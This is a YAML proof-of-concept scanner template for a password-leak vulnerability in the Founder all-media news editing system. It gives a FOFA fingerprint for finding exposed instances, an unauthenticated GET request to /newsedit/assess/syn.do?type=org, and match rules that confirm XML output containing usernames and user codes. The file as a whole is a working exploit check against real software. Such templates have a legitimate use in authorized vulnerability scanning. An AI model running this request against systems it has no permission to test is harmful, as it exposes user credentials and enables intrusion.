id: poc-yaml-founder-newsedit-password-leak
info:
  name: 方正全媒体采编系统密码泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: 方正全媒体采编系统
  fofa: app="FOUNDER-全媒体采编系统"
requests:
- method: GET
  path: /newsedit/assess/syn.do?type=org
  expression: 'status_code == 200 &&

    contains(body,"<?xml") &&

    contains(body,"</username>") &&

    contains(body,"</usercode>")

    '
variables: {}
transport: http
